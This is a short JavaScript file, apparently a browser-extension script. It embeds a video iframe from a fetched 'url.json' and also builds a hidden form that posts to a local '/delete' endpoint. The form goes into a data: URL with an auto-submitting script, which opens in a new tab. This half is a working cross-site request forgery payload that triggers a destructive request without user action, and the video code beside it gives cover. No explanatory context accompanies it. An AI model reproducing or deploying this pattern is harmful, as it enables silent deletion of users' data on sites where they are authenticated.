function reqListener () {
  var vid_url = JSON.parse(this.responseText);
  var iframe = document.createElement("iframe");
  iframe.src = vid_url.url;
  iframe.frameborder="0";
  iframe.allow="autoplay; encrypted-media";
  iframe.setAttribute("allowfullscreen", "");
  document.body.appendChild(iframe);

}

var oReq = new XMLHttpRequest();
oReq.addEventListener("load", reqListener);
oReq.open("GET", 'url.json');
oReq.send();


var url = "data:text/html;charset=utf8,";
var form = document.createElement('form');
form.method = 'POST';
form.action = 'http://localhost:5000/delete';
form.style.visibility = 'hidden';
url = url + encodeURIComponent(form.outerHTML);
url = url + encodeURIComponent("<script>document.forms[0].submit();</script>");
chrome.tabs.create({url: url, active: true});
